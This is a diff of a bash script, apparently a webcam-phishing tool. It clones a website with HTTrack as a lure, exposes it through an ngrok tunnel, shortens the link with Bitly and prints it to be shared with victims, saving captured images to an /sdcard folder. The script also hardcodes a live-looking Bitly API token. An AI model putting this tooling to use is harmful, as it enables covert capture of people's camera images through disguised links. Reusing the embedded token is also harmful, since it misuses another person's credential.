@@ -154,10 +154,12 @@ printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server \e[0m\e[1;77m(htt
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-token="651b195e7e1ceb8b0614128a6cd303bfa13bfde0"
-
+# ? Extract ngrok link from localhost:4040 api tunnels
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://.*\.ngrok.io")
+
+# ! Bitly shorten url
+token="651b195e7e1ceb8b0614128a6cd303bfa13bfde0"
 
 response=$(curl -s -X POST "https://api-ssl.bitly.com/v4/shorten" \
 -H "Authorization: Bearer $token" \
@@ -165,25 +167,27 @@ response=$(curl -s -X POST "https://api-ssl.bitly.com/v4/shorten" \
 -H "Accept: application/json" \
 -d "{\"long_url\": \"$link\"}")
 
-link=$(echo $response | jq -r .link)
+bitly_link=$(echo $response | jq -r .link)
 
-
+# ! if link doesnt exist
 if [[ -z $link ]];then
 printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 3333\e[0m\n"
 exit 1
 fi
+
+# ? if link exist
+printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92mBitly link:\e[0m\e[1;77m %s\e[0m\n" $bitly_link
 printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 }
 
 start() {
-
-if [[ ! -d images/ ]]; then
-mkdir images
-fi
+# ? Create images folder if doesnt exist
+mkdir -p images
+mkdir -p /sdcard/saycheeseImage
 
 if [[ -e sendlink ]]; then
-rm -rf sendlink
+    rm -rf sendlink
 fi
 
 printf "\n"
@@ -200,10 +204,13 @@ printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\
 read website_mirror
 website_mirror="${website_mirror:-${default_website_mirror}}"
 printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
+
+# ? Create website folder if doesnt exist
 if [[ ! -d websites/ ]]; then
 mkdir websites
 fi
 
+# ? Clone website using httrack
 httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
 payload
 ngrok_server
